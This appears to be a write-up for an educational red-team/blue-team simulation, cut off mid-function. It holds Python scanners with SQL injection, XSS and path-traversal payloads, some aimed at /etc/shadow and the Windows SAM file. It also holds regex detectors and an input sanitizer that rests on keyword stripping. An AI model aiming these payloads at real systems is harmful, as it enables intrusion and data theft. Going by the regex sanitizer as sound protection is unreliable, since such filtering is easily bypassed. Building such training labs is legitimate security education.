# Red Team vs Blue Team Cybersecurity Simulation System

## 📋 Project Overview

A comprehensive cybersecurity simulation platform featuring automated red team attacks, blue team defenses, and real-time monitoring dashboard. Built with Python, Node.js, React, and FastAPI for educational purposes in controlled environments.

## 🏗️ System Architecture

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Frontend      │    │   Backend       │    │   Python Tools  │
│   (React)       │◄──►│   (Node.js)     │◄──►│   (FastAPI)     │
│                 │    │                 │    │                 │
│ • Dashboard     │    │ • WebSocket     │    │ • Red Team      │
│ • Real-time     │    │ • REST API      │    │ • Blue Team     │
│ • Visualization │    │ • Integration   │    │ • Logging       │
└─────────────────┘    └─────────────────┘    └─────────────────┘
         │                        │                        │
         └────────────────────────┼────────────────────────┘
                                  │
                    ┌─────────────────┐
                    │   Database      │
                    │   (SQLite)      │
                    │                 │
                    │ • Logs          │
                    │ • Scores        │
                    │ • Results       │
                    └─────────────────┘
```

## 📁 Project Structure

```
cybersecurity-simulation/
│
├── 📁 frontend/                    # React Dashboard
│   ├── public/
│   ├── src/
│   │   ├── components/
│   │   │   ├── Dashboard.jsx
│   │   │   ├── AttackPanel.jsx
│   │   │   ├── DefensePanel.jsx
│   │   │   ├── LogsPanel.jsx
│   │   │   └── Scoreboard.jsx
│   │   ├── services/
│   │   │   └── api.js
│   │   ├── styles/
│   │   └── App.jsx
│   ├── package.json
│   └── README.md
│
├── 📁 backend/                     # Node.js API Server
│   ├── src/
│   │   ├── controllers/
│   │   │   ├── attackController.js
│   │   │   ├── defenseController.js
│   │   │   └── logController.js
│   │   ├── middleware/
│   │   │   └── cors.js
│   │   ├── routes/
│   │   │   ├── attacks.js
│   │   │   ├── defenses.js
│   │   │   └── logs.js
│   │   ├── services/
│   │   │   ├── pythonService.js
│   │   │   └── websocket.js
│   │   ├── utils/
│   │   │   └── logger.js
│   │   └── server.js
│   ├── package.json
│   └── README.md
│
├── 📁 python-tools/               # Python Security Tools
│   ├── red_team/
│   │   ├── __init__.py
│   │   ├── sql_injection.py
│   │   ├── xss_attack.py
│   │   └── path_traversal.py
│   ├── blue_team/
│   │   ├── __init__.py
│   │   ├── sql_defender.py
│   │   ├── xss_defender.py
│   │   └── path_defender.py
│   ├── core/
│   │   ├── __init__.py
│   │   ├── logger.py
│   │   ├── scorer.py
│   │   └── database.py
│   ├── api/
│   │   ├── __init__.py
│   │   └── main.py              # FastAPI server
│   ├── vulnerable_app/           # Test target
│   │   ├── app.py
│   │   ├── templates/
│   │   └── static/
│   ├── requirements.txt
│   └── README.md
│
├── 📁 database/
│   ├── init.sql
│   └── schema.sql
│
├── 📁 config/
│   ├── development.json
│   ├── production.json
│   └── docker-compose.yml
│
├── 📁 docs/
│   ├── API.md
│   ├── SETUP.md
│   └── SECURITY.md
│
├── 📁 scripts/
│   ├── start.sh
│   ├── setup.sh
│   └── test.sh
│
└── README.md
```

## 🔴 Red Team Tools (Python)

### 1. SQL Injection Tool

```python
# python-tools/red_team/sql_injection.py
import requests
import time
import logging
from typing import List, Dict, Any
from urllib.parse import urlencode

class SQLInjectionTool:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.logger = logging.getLogger(__name__)
        
        # Common SQL injection payloads
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null,null,null--",
            "'; DROP TABLE users;--",
            "' OR 'x'='x",
            "admin'--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "' UNION SELECT username, password FROM users--"
        ]
    
    def test_sql_injection(self, endpoint: str, parameters: Dict[str, str]) -> Dict[str, Any]:
        """Test SQL injection on specified endpoint"""
        results = {
            'endpoint': endpoint,
            'vulnerable': False,
            'successful_payloads': [],
            'responses': [],
            'timestamp': time.time()
        }
        
        for payload in self.payloads:
            try:
                # Test each parameter with the payload
                for param_name in parameters.keys():
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    response = requests.post(
                        f"{self.base_url}{endpoint}",
                        data=test_params,
                        timeout=5
                    )
                    
                    # Check for SQL injection indicators
                    if self._detect_sql_injection(response):
                        results['vulnerable'] = True
                        results['successful_payloads'].append({
                            'payload': payload,
                            'parameter': param_name,
                            'response_length': len(response.text),
                            'status_code': response.status_code
                        })
                        
                        self.logger.warning(f"SQL Injection successful: {payload}")
                    
                    results['responses'].append({
                        'payload': payload,
                        'parameter': param_name,
                        'status_code': response.status_code,
                        'response_time': response.elapsed.total_seconds()
                    })
                    
                    time.sleep(0.1)  # Rate limiting
                    
            except Exception as e:
                self.logger.error(f"Error testing payload {payload}: {str(e)}")
        
        return results
    
    def _detect_sql_injection(self, response: requests.Response) -> bool:
        """Detect if SQL injection was successful"""
        indicators = [
            'syntax error',
            'mysql_fetch',
            'ORA-',
            'Microsoft Access Driver',
            'ODBC SQL Server Driver',
            'SQLite3:',
            'PostgreSQL query failed'
        ]
        
        response_text = response.text.lower()
        
        # Check for error messages
        for indicator in indicators:
            if indicator.lower() in response_text:
                return True
        
        # Check for unusual response patterns
        if response.status_code == 500:
            return True
            
        return False

    def automated_scan(self, targets: List[Dict]) -> Dict[str, Any]:
        """Run automated SQL injection scan on multiple targets"""
        scan_results = {
            'scan_id': f"sqli_scan_{int(time.time())}",
            'timestamp': time.time(),
            'targets_scanned': len(targets),
            'vulnerabilities_found': 0,
            'results': []
        }
        
        for target in targets:
            result = self.test_sql_injection(target['endpoint'], target['parameters'])
            scan_results['results'].append(result)
            
            if result['vulnerable']:
                scan_results['vulnerabilities_found'] += 1
        
        return scan_results
```

### 2. XSS Attack Tool

```python
# python-tools/red_team/xss_attack.py
import requests
import time
import re
from typing import List, Dict, Any
from urllib.parse import quote

class XSSAttackTool:
    def __init__(self, base_url: str):
        self.base_url = base_url
        
        # XSS payloads for different contexts
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<<SCRIPT>alert('XSS')<</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ]
    
    def test_xss_vulnerability(self, endpoint: str, form_data: Dict[str, str]) -> Dict[str, Any]:
        """Test XSS vulnerability on form inputs"""
        results = {
            'endpoint': endpoint,
            'vulnerable': False,
            'vulnerable_parameters': [],
            'successful_payloads': [],
            'timestamp': time.time()
        }
        
        for payload in self.payloads:
            for param_name, param_value in form_data.items():
                try:
                    test_data = form_data.copy()
                    test_data[param_name] = payload
                    
                    # Submit form with XSS payload
                    response = requests.post(
                        f"{self.base_url}{endpoint}",
                        data=test_data,
                        timeout=5
                    )
                    
                    # Check if payload is reflected in response
                    if self._detect_xss_reflection(response.text, payload):
                        results['vulnerable'] = True
                        results['vulnerable_parameters'].append(param_name)
                        results['successful_payloads'].append({
                            'payload': payload,
                            'parameter': param_name,
                            'reflected': True
                        })
                        
                    time.sleep(0.1)
                    
                except Exception as e:
                    print(f"Error testing XSS payload: {str(e)}")
        
        return results
    
    def _detect_xss_reflection(self, response_text: str, payload: str) -> bool:
        """Check if XSS payload is reflected in the response"""
        # Simple reflection check
        if payload in response_text:
            return True
        
        # Check for partially reflected payloads
        payload_parts = re.findall(r'<[^>]+>', payload)
        for part in payload_parts:
            if part in response_text:
                return True
        
        return False
    
    def test_stored_xss(self, endpoint: str, form_data: Dict[str, str], 
                       view_endpoint: str) -> Dict[str, Any]:
        """Test for stored XSS vulnerabilities"""
        results = {
            'endpoint': endpoint,
            'view_endpoint': view_endpoint,
            'stored_xss_found': False,
            'payloads_stored': [],
            'timestamp': time.time()
        }
        
        for payload in self.payloads[:5]:  # Test fewer payloads for stored XSS
            try:
                test_data = form_data.copy()
                # Assume first parameter is content field
                first_param = list(form_data.keys())[0]
                test_data[first_param] = f"Test content {payload}"
                
                # Submit data
                submit_response = requests.post(
                    f"{self.base_url}{endpoint}",
                    data=test_data,
                    timeout=5
                )
                
                # Check if stored by viewing the page
                time.sleep(1)
                view_response = requests.get(
                    f"{self.base_url}{view_endpoint}",
                    timeout=5
                )
                
                if self._detect_xss_reflection(view_response.text, payload):
                    results['stored_xss_found'] = True
                    results['payloads_stored'].append(payload)
                
            except Exception as e:
                print(f"Error testing stored XSS: {str(e)}")
        
        return results
```

### 3. Path Traversal Tool

```python
# python-tools/red_team/path_traversal.py
import requests
import time
from typing import List, Dict, Any
from urllib.parse import quote

class PathTraversalTool:
    def __init__(self, base_url: str):
        self.base_url = base_url
        
        # Path traversal payloads
        self.payloads = [
            "../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "file:///c:/windows/system32/drivers/etc/hosts"
        ]
        
        # Files to look for
        self.target_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/version",
            "/proc/self/environ",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\system32\\config\\sam",
            "C:\\windows\\win.ini"
        ]
    
    def test_path_traversal(self, endpoint: str, parameter: str) -> Dict[str, Any]:
        """Test path traversal vulnerability"""
        results = {
            'endpoint': endpoint,
            'parameter': parameter,
            'vulnerable': False,
            'successful_payloads': [],
            'files_accessed': [],
            'timestamp': time.time()
        }
        
        for payload in self.payloads:
            try:
                # Test with URL parameter
                if '?' in endpoint:
                    test_url = f"{self.base_url}{endpoint}&{parameter}={quote(payload)}"
                else:
                    test_url = f"{self.base_url}{endpoint}?{parameter}={quote(payload)}"
                
                response = requests.get(test_url, timeout=5)
                
                if self._detect_file_disclosure(response.text):
                    results['vulnerable'] = True
                    results['successful_payloads'].append({
                        'payload': payload,
                        'status_code': response.status_code,
                        'content_length': len(response.text)
                    })
                    
                    # Try to identify which file was accessed
                    file_type = self._identify_file_type(response.text)
                    if file_type:
                        results['files_accessed'].append(file_type)
                
                time.sleep(0.1)
                
            except Exception as e:
                print(f"Error testing path traversal: {str(e)}")
        
        return results
    
    def _detect_file_disclosure(self, response_text: str) -> bool:
        """Detect if sensitive file was disclosed"""
        # Unix/Linux indicators
        unix_indicators = [
            "root:x:",
            "/bin/bash",
            "/bin/sh",
            "daemon:",
            "nobody:",
            "# /etc/passwd"
        ]
        
        # Windows indicators
        windows_indicators = [
            "# Copyright (c) 1993-2009 Microsoft Corp",
            "[hosts]",
            "localhost",
            "127.0.0.1"
        ]
        
        response_lower = response_text.lower()
        
        for indicator in unix_indicators + windows_indicators:
            if indicator.lower() in response_lower:
                return True
        
        return False
    
    def _identify_file_type(self, response_text: str) -> str:
        """Identify what type of file was accessed"""
        if "root:x:" in response_text or "/bin/bash" in response_text:
            return "/etc/passwd"
        elif "# /etc/hosts" in response_text.lower():
            return "/etc/hosts"
        elif "microsoft corp" in response_text.lower():
            return "windows hosts file"
        elif "linux version" in response_text.lower():
            return "/proc/version"
        
        return "unknown_file"
    
    def automated_directory_scan(self, base_endpoint: str, parameter: str) -> Dict[str, Any]:
        """Perform automated directory traversal scan"""
        results = {
            'scan_id': f"path_traversal_{int(time.time())}",
            'base_endpoint': base_endpoint,
            'parameter': parameter,
            'files_found': [],
            'vulnerabilities': 0,
            'timestamp': time.time()
        }
        
        for target_file in self.target_files:
            # Generate payloads for this specific file
            file_payloads = [
                f"../{target_file}",
                f"../../{target_file}",
                f"../../../{target_file}",
                f"../../../../{target_file}",
                f"../../../../../{target_file}",
                target_file
            ]
            
            for payload in file_payloads:
                try:
                    test_url = f"{self.base_url}{base_endpoint}?{parameter}={quote(payload)}"
                    response = requests.get(test_url, timeout=3)
                    
                    if self._detect_file_disclosure(response.text):
                        results['files_found'].append({
                            'file': target_file,
                            'payload': payload,
                            'size': len(response.text)
                        })
                        results['vulnerabilities'] += 1
                        break  # Found this file, move to next
                        
                except Exception:
                    continue
        
        return results
```

## 🔵 Blue Team Defenders (Python)

### 1. SQL Injection Defender

```python
# python-tools/blue_team/sql_defender.py
import re
import logging
import time
from typing import Dict, Any, List
import sqlite3

class SQLDefender:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.blocked_attempts = []
        
        # SQL injection patterns
        self.sql_patterns = [
            r"(\bUNION\b.*\bSELECT\b)",
            r"(\bOR\b.*=.*)",
            r"(\bAND\b.*=.*)",
            r"(';.*--)",
            r"(\bDROP\b.*\bTABLE\b)",
            r"(\bINSERT\b.*\bINTO\b)",
            r"(\bUPDATE\b.*\bSET\b)",
            r"(\bDELETE\b.*\bFROM\b)",
            r"(/\*.*\*/)",
            r"(\bEXEC\b)",
            r"(\bEXECUTE\b)",
            r"(\bxp_cmdshell\b)",
        ]
        
        # Compile patterns for better performance
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.sql_patterns]
    
    def detect_sql_injection(self, input_data: Dict[str, str]) -> Dict[str, Any]:
        """Detect SQL injection attempts in input data"""
        detection_result = {
            'is_malicious': False,
            'threats_detected': [],
            'risk_level': 'low',
            'blocked': False,
            'timestamp': time.time()
        }
        
        for field_name, field_value in input_data.items():
            if isinstance(field_value, str):
                threats = self._scan_for_sql_patterns(field_value)
                if threats:
                    detection_result['is_malicious'] = True
                    detection_result['threats_detected'].extend([{
                        'field': field_name,
                        'threat': threat,
                        'pattern': pattern
                    } for threat, pattern in threats])
        
        # Determine risk level
        if detection_result['threats_detected']:
            risk_level = self._calculate_risk_level(detection_result['threats_detected'])
            detection_result['risk_level'] = risk_level
            
            # Block high and critical risks
            if risk_level in ['high', 'critical']:
                detection_result['blocked'] = True
                self._log_blocked_attempt(input_data, detection_result)
        
        return detection_result
    
    def _scan_for_sql_patterns(self, input_string: str) -> List[tuple]:
        """Scan input string for SQL injection patterns"""
        threats = []
        
        for i, pattern in enumerate(self.compiled_patterns):
            matches = pattern.findall(input_string)
            if matches:
                threats.extend([(match, self.sql_patterns[i]) for match in matches])
        
        return threats
    
    def _calculate_risk_level(self, threats: List[Dict]) -> str:
        """Calculate risk level based on detected threats"""
        critical_patterns = ['DROP', 'DELETE', 'UPDATE', 'INSERT', 'EXEC']
        high_patterns = ['UNION', 'xp_cmdshell']
        
        for threat in threats:
            threat_upper = threat['threat'].upper()
            if any(pattern in threat_upper for pattern in critical_patterns):
                return 'critical'
            elif any(pattern in threat_upper for pattern in high_patterns):
                return 'high'
        
        return 'medium' if threats else 'low'
    
    def sanitize_input(self, input_data: Dict[str, str]) -> Dict[str, str]:
        """Sanitize input data to prevent SQL injection"""
        sanitized_data = {}
        
        for field_name, field_value in input_data.items():
            if isinstance(field_value, str):
                # Escape single quotes
                sanitized_value = field_value.replace("'", "''")
                
                # Remove or escape dangerous keywords
                for pattern in self.sql_patterns:
                    sanitized_value = re.sub(pattern, '', sanitized_value, flags=re.IGNORECASE)
                
                sanitized_data[field_name] = sanitized_value
            else:
                sanitized_data[field_name] = field_value
        
        return sanitized_data
    
    def create_safe_query(self, query_template: str, parameters: Dict) -> tuple:
        """Create parameterized query to prevent SQL injection"""
        # Convert named parameters to positional
        safe_query = query_template
        param_values = []
        
        for param_name, param_value in parameters.items():
            placeholder = f":{param_name}"
            if placeholder in safe_query:
                safe_query = safe_query.replace(placeholder, "?")
                param_values.append(param_value)
        
        return safe_query, tuple(param_values)
    
    def _log_blocked_attempt(self, input_data: Dict, detection_result: Dict):
        """Log blocked SQL injection attempt"""
        blocked_attempt = {
            'timestamp': time.time(),
            'input_data': input_data,
            'threats': detection_result['threats_detected'],
            'risk_level': detection_result['risk_level']
        }
        
        self.blocked_attempts.append(blocked_attempt)
        self.logger.warning(f"Blocked SQL injection attempt: {detection_result['risk_level']} risk")
    
    def get_defense_stats(self) -> Dict[str, Any]:
        """Get defense statistics"""
        return {
            'total_blocked_attempts': len(self.blocked_attempts),
            'recent_attempts': self.blocked_attempts[-10:] if self.blocked_attempts else [],
            'risk_distribution': self._calculate_risk_distribution()
        }
    
    def _calculate_risk_distribution(self) -> Dict[str, int]:
        """Calculate distribution of risk levels"""
        distribution = {'low': 0, 'medium': 0, 'high': 0, 'critical': 0}
        
        for attempt in self.blocked_attempts:
            risk_level = attempt.get('risk_level', 'low')
            distribution[risk_level] += 1
        
        return distribution
```

### 2. XSS Defender

```python
# python-tools/blue_team/xss_defender.py
import re
import html
import time
from typing import Dict, Any, List
import logging

class XSSDefender:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.blocked_attempts = []
        
        # XSS patterns
        self.xss_patterns = [
            r"<script[^>]*>.*?</script>",
            r"<iframe[^>]*>.*?</iframe>",
            r"javascript:",
            r"vbscript:",
            r"onload\s*=",
            r"onerror\s*=",
            r"onmouseover\s*=",
            r"onfocus\s*=",
            r"onblur\s*=",
            r"onchange\s*=",
            r"onclick\s*=",
            r"ondblclick\s*=",
            r"onkeydown\s*=",
            r"onkeypress\s*=",
            r"onkeyup\s*=",
            r"onsubmit\s*=",
            r"<img[^>]*onerror",
            r"<svg[^>]*onload",
            r"<input[^>]*onfocus",
            r"<body[^>]*onload"
        ]
        
        # Dangerous HTML tags
        self.dangerous_tags = [
            'script', 'iframe', 'object', 'embed', 'form', 'input',
            'textarea', 'button', 'select', 'option', 'link', 'meta'
        ]
        
        # Compile patterns
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE | re.DOTALL) 
                                 for pattern in self.xss_patterns]
    
    def detect_xss_attempt(self, input_data: Dict[str, str]) -> Dict[str, Any]:
        """Detect XSS attempts in input data"""
        detection_result = {
            'is_malicious': False,
            'threats_detected': [],
            'risk_level': 'low',
            'blocked': False,
            'timestamp': time.time()
        }
        
        for field_name, field_value in input_data.items():
            if isinstance(field_value, str):
                threats = self._scan_for_xss_patterns(field_value)
                if threats:
                    detection_result['is_malicious'] = True
                    detection_result['threats_detected'].extend([{
                        'field': field_name,
                        'threat_type': threat_type,
                        'pattern_matched': pattern
                    } for threat_type, pattern in threats])
        
        # Calculate risk level
        if detection_result['threats_detected']:
            detection_result['risk_level'] = self._calculate_xss_risk_level(
                detection_result['threats_detected']
            )
            
            # Block medium and above risks
            if detection_result['risk_level'] in ['medium', 'high', 'critical']:
                detection_result['blocked'] = True
                self._log_blocked_xss_attempt(input_data, detection_result)
        
        return detection_result
    
    def _scan_for_xss_patterns(self, input_string: str) -> List[tuple]:
        """Scan for XSS patterns in input string"""
        threats = []
        
        for i, pattern in enumerate(self.compiled_patterns):
            if pattern.search(input_string):
                threat_type = self._categorize_xss_threat(self.xss_patterns[i])
                threats.append((threat_type, self.xss_patterns[i]))
        
        return threats
    
    def _categorize_xss_threat(self, pattern: str) -> str:
        """Categorize XSS threat type"""
        if 'script' in pattern.lower():
            return 'script_injection'
        elif 'javascript:' in pattern.lower() or 'vbscript:' in pattern.lower():
            return 'protocol_handler'
        elif 'iframe' in pattern.lower():
            return 'iframe_injection'
        elif any(event in pattern.lower() for event in ['onload', 'onerror', 'onclick']):
            return 'event_handler'
        else:
            return 'generic_xss'
    
    def _calculate_xss_risk_level(self, threats: List[Dict]) -> str:
        """Calculate XSS risk level"""
        critical_threats = ['script_injection', 'iframe_injection']
        high_threats = ['protocol_handler']
        
        for threat in threats:
            if threat['threat_type'] in critical_threats:
                return 'critical'
            elif threat['threat_type'] in high_threats:
                return 'high'
        
        return 'medium' if threats else 'low'
    
    def sanitize_output(self, content: str, context: str = 'html') -> str:
        """Sanitize content for safe output"""
        if context == 'html':
            # HTML encode dangerous characters
            